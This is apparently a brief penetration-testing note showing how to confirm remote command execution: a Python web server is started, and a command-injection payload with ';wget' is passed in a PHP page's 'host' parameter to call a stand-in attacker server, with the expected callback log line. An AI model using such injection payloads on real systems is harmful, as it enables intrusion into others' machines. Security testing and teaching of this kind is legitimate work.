# RCE (by example)



## RCE

┌──(kali@nullbrain)-[~]
└─$ sudo python3 -m http.server 80
[sudo] password for kali:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

### Curl
http://<vulnerable>/index.php?host=127.0.0.1;wget%20<attacker_webserver>/foo.txt

Expected Log:

`<vulnerable_host_ip> - - [<timestamp>] "GET /foo.txt HTTP/1.1" 404 -`


This test will indicate that we could potentially execute RCE with some sort of payload.